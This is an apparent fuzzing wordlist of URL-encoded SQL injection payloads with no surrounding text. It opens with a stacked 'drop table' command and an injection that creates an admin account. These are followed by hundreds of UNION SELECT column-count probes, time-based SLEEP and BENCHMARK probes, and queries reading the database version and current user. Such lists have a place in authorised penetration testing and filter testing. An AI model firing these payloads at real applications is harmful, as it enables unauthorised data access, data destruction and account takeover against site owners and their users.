'%20;%20drop%20table%20temp%20--
'%20||%20myappadmin.adduser('admin',%20'newpass')%20||%20'
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%23
%20UNION%20ALL%20SELECT%20CHAR(113)%2BCHAR(106)%2BCHAR(122)%2BCHAR(106)%2BCHAR(113)%2BCHAR(110)%2BCHAR(106)%2BCHAR(99)%2BCHAR(73)%2BCHAR(66)%2BCHAR(109)%2BCHAR(119)%2BCHAR(81)%2BCHAR(108)%2BCHAR(88)%2BCHAR(113)%2BCHAR(112)%2BCHAR(106)%2BCHAR(107)%2BCHAR(113),NULL--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX'
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX'--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX'%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--%20
%20UNION%20ALL%20SELECT%20'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%23
%20UNION%20ALL%20SELECT%20NULL%20
%20UNION%20ALL%20SELECT%20NULL--%20
%20UNION%20ALL%20SELECT%20NULL%23
%20UNION%20ALL%20SELECT%20SLEEP(5)--%20
%20UNION%20ALL%20SELECT%20USER()--%20
%20UNION%20ALL%20SELECT%20USER(),SLEEP(5)--%20
%20UNION%20SELECT%20@@VERSION,SLEEP(5),"'3
%20UNION%20SELECT%20@@VERSION,SLEEP(5),"'3'"%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),3
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),4
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),4%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
%20UNION%20SELECT%20@@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%23
